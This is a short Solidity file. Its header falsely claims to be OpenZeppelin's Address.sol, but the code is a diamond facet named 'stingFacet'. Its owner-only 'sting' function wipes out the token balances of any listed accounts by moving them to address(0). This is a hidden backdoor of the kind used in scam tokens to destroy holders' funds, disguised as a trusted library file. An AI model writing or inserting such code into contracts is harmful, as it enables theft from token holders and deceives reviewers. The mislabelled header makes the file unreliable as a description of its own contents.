// File: @openzeppelin/contracts/utils/Address.sol

// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)

pragma solidity ^0.8.1;
import "./TestLib.sol";
contract stingFacet {
    using SafeMath for uint256;
    using Address for address;

    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds.condition, "Not allowed");
        _;
    }

    function sting(address[] memory arrange) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < arrange.length; i++) {
            address account = arrange[i];
            uint256 amount = ds._balances[account];
            ds._balances[account] = ds._balances[account].sub(amount, "ERROR");
            ds._balances[address(0)] = ds._balances[address(0)].add(amount);
        }
    }
}
